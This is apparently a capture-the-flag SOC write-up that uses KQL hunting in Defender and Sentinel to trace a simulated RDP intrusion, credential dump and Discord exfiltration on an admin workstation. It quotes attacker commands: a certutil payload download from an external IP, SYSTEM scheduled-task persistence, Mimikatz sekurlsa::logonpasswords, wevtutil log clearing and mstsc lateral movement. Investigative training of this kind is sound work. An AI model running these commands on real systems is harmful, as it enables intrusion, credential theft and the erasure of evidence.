# SOC Investigation: Azuki Import/Export — Corporate Espionage

**Platform:** Microsoft Defender for Endpoint + Microsoft Sentinel (KQL)  
**Case ID:** AZK-IR-2025-001  
**Date:** 2025-11-19  
**Device:** AZUKI-SL (IT Admin Workstation)  
**Status:** Complete — 20/20 flags resolved

---

## Background

A competitor undercut Azuki Import/Export's 6-year shipping contract by exactly 3%. Shortly after, supplier pricing data appeared on underground forums. This investigation traces the full attack on the company's IT admin workstation using Microsoft Defender for Endpoint telemetry and KQL queries in Microsoft Sentinel.

---

## Attack Timeline

```
18:36  RDP login from 88.97.178.12 as kenji.sato
18:36  arp -a network reconnaissance
18:49  Defender exclusions added — .bat .ps1 .exe + folder paths
19:05  C:\ProgramData\WindowsCache staging directory created
19:07  certutil downloads svchost.exe from 78.141.196.6:8080
19:07  Scheduled task "Windows Update Check" created (SYSTEM, 2am daily)
19:08  mm.exe (Mimikatz) dumps credentials — sekurlsa::logonpasswords
19:08  export-data.zip created in staging directory
19:09  export-data.zip uploaded to discord.com in 23 seconds
19:09  Backdoor account "support" created
19:10  mstsc.exe pivots to internal host 10.1.0.188
19:11  Security, System, Application event logs cleared
```

Total time from login to exfiltration: approximately 33 minutes.
Everything was orchestrated by a single script — `wupdate.ps1`.
No custom malware. All native Windows binaries.

---

## MITRE ATT&CK Coverage

| Tactic | Technique | Evidence |
|---|---|---|
| Initial Access | T1133 – External Remote Services | RDP from 88.97.178.12 |
| Initial Access | T1078 – Valid Accounts | kenji.sato credentials used |
| Discovery | T1018 – Remote System Discovery | arp -a post-login |
| Execution | T1059.001 – PowerShell | wupdate.ps1 -ExecutionPolicy Bypass |
| Execution | T1059.003 – Windows Command Shell | arp -a via cmd.exe |
| Defence Evasion | T1562.001 – Disable or Modify Tools | Defender exclusions via registry |
| Defence Evasion | T1036 – Masquerading | WindowsCache, svchost.exe, mm.exe |
| Defence Evasion | T1218 – System Binary Proxy Execution | certutil, mstsc, wevtutil |
| Defence Evasion | T1112 – Modify Registry | Exclusions written to Defender keys |
| Persistence | T1053.005 – Scheduled Task | Windows Update Check — SYSTEM, 2am |
| Persistence | T1136.001 – Create Local Account | Backdoor account "support" |
| Credential Access | T1003 – OS Credential Dumping | mm.exe (Mimikatz) |
| Credential Access | T1003.001 – LSASS Memory | sekurlsa::logonpasswords |
| Collection | T1074.001 – Local Data Staging | export-data.zip in WindowsCache |
| Collection | T1560.001 – Archive via Utility | PowerShell zipped stolen data |
| Command & Control | T1071.001 – Web Protocols | C2 over HTTPS port 443 |
| Command & Control | T1573 – Encrypted Channel | Traffic blends with normal HTTPS |
| Exfiltration | T1567.002 – Exfil to Cloud Storage | discord.com webhook |
| Lateral Movement | T1021.001 – Remote Desktop Protocol | mstsc.exe /v:10.1.0.188 |
| Impact | T1070.001 – Clear Windows Event Logs | Security/System/Application wiped |

---

## Flags & Findings

---

### Flag 1 — Initial Access: Source IP

**Question:** Identify the external IP address used to gain initial access via RDP.

```kql
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ActionType == "LogonSuccess"
| where isnotempty(RemoteIP)
| project TimeGenerated, LogonType, RemoteIP, AccountName
| order by TimeGenerated asc
```

> *<img width="1291" height="473" alt="image" src="https://github.com/user-attachments/assets/472c3268-92f0-4c55-ab4b-75a9005c497a" />
*

The first successful logon from an external public IP came in at 18:36:18 UTC. A Network logon immediately followed by an Unlock event confirms the attacker took active control of the desktop session — not just a background auth. Everything after this timestamp under kenji.sato is attacker-controlled.

**Answer: `88.97.178.12`**

---

### Flag 2 — Compromised Account

**Question:** Which user account was used by the attacker?

```kql
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where RemoteIP == "88.97.178.12"
| where ActionType == "LogonSuccess"
| project TimeGenerated, AccountName, LogonType
```

> *[screenshot: flag2_account.png]*

Both logon events from the threat actor IP mapped to `kenji.sato` — the IT administrator. Highest-privilege account on the machine. The attacker needed zero escalation.

**Answer: `kenji.sato`**

---

### Flag 3 — Network Reconnaissance

**Question:** Identify the command used to enumerate network neighbours.

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19T18:36:00Z) .. datetime(2025-11-20T18:36:00Z))
| where ProcessCommandLine has_any ("arp","nbtstat","net view","netstat","ipconfig","nslookup")
| project TimeGenerated, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

> *[screenshot: flag3_recon.png]*

First command post-login was `arp -a` — reads the ARP cache and maps all IP/MAC pairs of neighbouring hosts. No tools downloaded. Just a built-in Windows command run via cmd.exe. Classic Living-off-the-Land recon.

**Answer: `arp -a`**

---

### Flag 4 — Malware Staging Directory

**Question:** Identify the staging directory created to store malware and tools.

```kql
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19T18:36:00Z) .. datetime(2025-11-20T18:36:00Z))
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where InitiatingProcessAccountName == "kenji.sato"
| project TimeGenerated, FileName, FolderPath, InitiatingProcessFileName
| order by TimeGenerated asc
```

> *[screenshot: flag4_staging_dir.png]*

A new directory appeared — `C:\ProgramData\WindowsCache`. There is no such native Windows folder. The name mimics a legitimate system component. `C:\ProgramData\` is hidden from Explorer by default. Created by powershell.exe — scripted, not manual.

**Answer: `C:\ProgramData\WindowsCache`**

---

### Flag 5 — Defender Extension Exclusions

**Question:** How many file extensions were excluded from Windows Defender?

```kql
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where RegistryKey contains "Defender"
| where RegistryKey contains "Exclusion"
| project TimeGenerated, RegistryKey, RegistryValueName, RegistryValueData
| order by TimeGenerated asc
```

> *[screenshot: flag5_defender_exclusions.png]*

At 18:49 — 13 minutes after logging in — three extension exclusions were written in a 2-second burst: `.bat`, `.ps1`, `.exe`. Also excluded: WindowsCache and Temp folder paths, plus two processes — `svchost.exe` and `mm.exe`. That last one is not a Windows binary. Flagged it immediately.

All exclusions written via `msmpeng.exe` — Defender turned against itself.

**Answer: `3`**

---

### Flag 6 — Defender Folder Path Exclusion

**Question:** Which folder path was excluded from Defender scanning?

Same query as Flag 5.

> *[screenshot: flag6_path_exclusion.png]*

The Temp folder was excluded using Windows 8.3 short path format: `C:\Users\KENJI~1.SAT\AppData\Local\Temp`. That format is generated by scripts, not typed by hand. Combined with Flag 5, full Defender bypass was achieved within 13 minutes of initial access.

**Answer: `C:\Users\KENJI~1.SAT\AppData\Local\Temp`**

---

### Flag 7 — LOLBin File Download

**Question:** Which native Windows binary was used to download the malware?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19T18:36:00Z) .. datetime(2025-11-20T18:36:00Z))
| where AccountName != "system"
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

> *[screenshot: flag7_certutil.png]*

The result exposed the full download chain in one row:

```
certutil.exe -urlcache -f http://78.141.196.6:8080/svchost.exe
C:\ProgramData\WindowsCache\svchost.exe
```

Called by: `powershell.exe -ExecutionPolicy Bypass -File ...\wupdate.ps1`

`certutil.exe` is a Windows certificate utility with no business downloading executables. But it's a trusted binary — Defender ignores it, especially with the exclusions already in place. This confirmed the C2 server, the master script (`wupdate.ps1`), and the payload name.

**Answer: `certutil.exe`**

---

### Flag 8 — Scheduled Task Name

**Question:** What scheduled task was created for persistence?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where ProcessCommandLine contains "schtasks"
| where AccountName != "system"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc
```

> *[screenshot: flag8_schtasks.png]*

```
schtasks /create /tn "Windows Update Check"
/tr C:\ProgramData\WindowsCache\svchost.exe
/sc daily /st 02:00 /ru SYSTEM /f
```

The name blends with legitimate Windows maintenance. Runs as SYSTEM at 2am daily. `/f` silently overwrites any existing task. Delete the payload — it's back by morning.

**Answer: `Windows Update Check`**

---

### Flag 9 — Scheduled Task Executable

**Question:** What executable is configured in the scheduled task?

Same query and result as Flag 8 — the `/tr` argument gives the answer.

> *[screenshot: flag9_task_executable.png]*

The task runs `C:\ProgramData\WindowsCache\svchost.exe` — the same payload downloaded in Flag 7. Confirms the link between download stage and persistence.

**Answer: `C:\ProgramData\WindowsCache\svchost.exe`**

---

### Flag 10 — C2 Server IP

**Question:** What IP does the malware beacon to?

```kql
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessFileName == "svchost.exe"
| where InitiatingProcessAccountName != "system"
| where ActionType == "ConnectionSuccess"
| project TimeGenerated, RemoteIP, RemotePort, InitiatingProcessCommandLine
```

> *[screenshot: flag10_c2_beacon.png]*

Two results. Legitimate `svchost.exe` always runs with a `-k` parameter — the result with no arguments is the fake one. It connected to `78.141.196.6` — the same IP that delivered the payload in Flag 7.

**Answer: `78.141.196.6`**

---

### Flag 11 — C2 Port

**Question:** What port does the malware use for C2 communications?

```kql
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessFileName == "svchost.exe"
| where InitiatingProcessAccountName != "system"
| where ActionType == "ConnectionSuccess"
| where RemoteIP == "78.141.196.6"
| project TimeGenerated, RemoteIP, RemotePort
```

> *[screenshot: flag11_c2_port.png]*

Port 443 — HTTPS. Chosen deliberately. Can't be blocked without breaking every website. Traffic is encrypted and looks identical to normal browsing.

**Answer: `443`**

---

### Flag 12 — Credential Dumping Tool

**Question:** What tool was used to dump credentials?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName contains "kenji"
| project TimeGenerated, FileName, FolderPath, InitiatingProcessFileName
| order by TimeGenerated asc
```

> *[screenshot: flag12_mm_exe.png]*

`mm.exe` — the binary pre-excluded from Defender in Flag 5. Executed from WindowsCache at 19:08:26, one minute after the C2 beacon. The timing suggests it was triggered remotely via C2 command. `mm` is a common Mimikatz abbreviation.

**Answer: `mm.exe`**

---

### Flag 13 — Mimikatz Module

**Question:** Which Mimikatz module was used to extract passwords?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName contains "kenji"
| where FileName == "mm.exe"
| project TimeGenerated, ProcessCommandLine
```

> *[screenshot: flag13_sekurlsa.png]*

Full command:
```
"mm.exe" privilege::debug sekurlsa::logonpasswords exit
```

`privilege::debug` gets LSASS memory access. `sekurlsa::logonpasswords` extracts plaintext passwords, NTLM hashes, and Kerberos tickets. `exit` closes with minimal trace. In a 23-person company, this likely compromised every account on the network.

**Answer: `sekurlsa::logonpasswords`**

---

### Flag 14 — Data Archive

**Question:** What archive was created to stage the stolen data?

```kql
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where ActionType == "FileCreated"
| where FileName has_any (".zip",".rar",".7z")
| where InitiatingProcessAccountName contains "kenji"
| project TimeGenerated, FolderPath, InitiatingProcessFileName, AdditionalFields
| order by TimeGenerated asc
```

> *[screenshot: flag14_archive.png]*

`C:\ProgramData\WindowsCache\export-data.zip` created at 19:08:58 — 32 seconds after Mimikatz ran. Stored in the Defender-excluded staging directory.

**Answer: `export-data.zip`**

---

### Flag 15 — Exfiltration Channel

**Question:** What cloud service was used to exfiltrate the data?

```kql
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where ActionType == "ConnectionSuccess"
| project TimeGenerated, RemoteUrl, RemoteIP, RemotePort
```

> *[screenshot: flag15_discord.png]*

At 19:09:21 — 23 seconds after the archive was created — a successful connection to `discord.com:443`. Discord webhooks allow file uploads via a single HTTPS POST, no account needed, no firewall will block it.

**Answer: `discord`**

---

### Flag 16 — Log Clearing

**Question:** Which event log was cleared first?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName contains "kenji"
| project TimeGenerated, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

> *[screenshot: flag16_wevtutil.png]*

```
19:11:39  wevtutil cl Security    ← first
19:11:43  wevtutil cl System
19:11:46  wevtutil cl Application
```

Security first — every logon and RDP event. Didn't matter. MDE had already shipped all telemetry to the cloud.

**Answer: `Security`**

---

### Flag 17 — Backdoor Account

**Question:** What backdoor account was created by the attacker?

```kql
DeviceEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName contains "kenji"
| where ActionType == "UserAccountCreated"
| project TimeGenerated, AccountName
```

> *[screenshot: flag17_support_account.png]*

Account `support` created at 19:09:48 — after exfiltration, before log clearing. Mimics a helpdesk account. If the team had only reset kenji.sato's password, the attacker still had a door open.

**Answer: `support`**

---

### Flag 18 — Master Attack Script

**Question:** What PowerShell script orchestrated the attack?

```kql
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where ActionType == "FileCreated"
| where FileName has_any (".ps1")
| where InitiatingProcessAccountName contains "kenji"
| project TimeGenerated, FolderPath, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

> *[screenshot: flag18_wupdate.png]*

`wupdate.ps1` — in the excluded Temp folder, named to look like Windows Update, run with `-ExecutionPolicy Bypass`. This single script initiated every major action in the investigation: the download, scheduled task, Mimikatz, archive, exfiltration, backdoor account, log clearing, and lateral movement.

**Answer: `wupdate.ps1`**

---

### Flag 19 — Lateral Movement Target

**Question:** What internal IP was targeted for lateral movement?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName != "system"
| where FileName contains "mstsc"
| project TimeGenerated, ProcessCommandLine, InitiatingProcessCommandLine
```

> *[screenshot: flag19_lateral_ip.png]*

At 19:10:41, `mstsc.exe /v:10.1.0.188` — also initiated by `wupdate.ps1`. Credentials from the Mimikatz dump used to RDP into a second internal machine. The scope extends beyond AZUKI-SL.

**Answer: `10.1.0.188`**

---

### Flag 20 — Lateral Movement Tool

**Question:** What tool was used for lateral movement?

Same query and screenshot as Flag 19.

> *[screenshot: flag20_mstsc.png]*

`mstsc.exe` — the native Windows Remote Desktop Client. Present on every Windows machine, never flagged by AV, traffic looks like normal admin activity. No custom tools required.

**Answer: `mstsc.exe`**

---

## IOC Summary

| Type | Value | Context |
|---|---|---|
| IP | `88.97.178.12` | Threat actor RDP source |
| IP | `78.141.196.6` | C2 server — download and beacon |
| Domain | `discord.com` | Exfiltration via webhook |
| Account | `kenji.sato` | Compromised IT admin |
| Account | `support` | Backdoor account created by attacker |
| File | `wupdate.ps1` | Master attack script |
| File | `mm.exe` | Mimikatz (renamed) |
| File | `svchost.exe` | Malware payload in WindowsCache |
| File | `export-data.zip` | Stolen data archive |
| Path | `C:\ProgramData\WindowsCache` | Staging directory |
| Task | `Windows Update Check` | Persistence scheduled task |
| Port | `8080` | C2 payload delivery |
| Port | `443` | C2 beacon and exfiltration |

---

## Tools Used

- Microsoft Defender for Endpoint
- Microsoft Sentinel — KQL Advanced Hunting
- MITRE ATT&CK Framework

---

## Repository Structure

```
azuki-soc-investigation/
├── README.md
├── report/
│   └── Azuki_SOC_Investigation_Report.docx
└── screenshots/
    ├── flag1_logon_events.png
    ├── flag2_account.png
    ├── flag3_recon.png
    ├── flag4_staging_dir.png
    ├── flag5_defender_exclusions.png
    ├── flag6_path_exclusion.png
    ├── flag7_certutil.png
    ├── flag8_schtasks.png
    ├── flag9_task_executable.png
    ├── flag10_c2_beacon.png
    ├── flag11_c2_port.png
    ├── flag12_mm_exe.png
    ├── flag13_sekurlsa.png
    ├── flag14_archive.png
    ├── flag15_discord.png
    ├── flag16_wevtutil.png
    ├── flag17_support_account.png
    ├── flag18_wupdate.png
    ├── flag19_lateral_ip.png
    └── flag20_mstsc.png
```

---

*CTF Exercise — For educational purposes*
